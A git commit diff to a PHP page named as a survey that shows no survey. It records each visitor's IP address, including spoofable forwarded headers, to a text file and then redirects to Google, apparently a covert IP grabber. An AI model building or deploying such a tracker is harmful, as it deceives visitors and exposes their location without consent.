ffabdb58e355436266efc77b993d298b8789b86e
JJLionHeart <jj.lopezjaimez@gmail.com>
2017-10-31 20:05:17 -0600

    barbs

--- encuesta.php
+++ encuesta.php
@@ -4,7 +4,27 @@
 </head>
 </html>
 <?php
-$ip = $_SERVER['HTTP_CLIENT_IP'];
+function getIP() {
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    return $ip;
+}
+$ip = getIP();
 file_put_contents("ip.txt", $ip);
 header("location: http://www.google.com.mx");
 die();
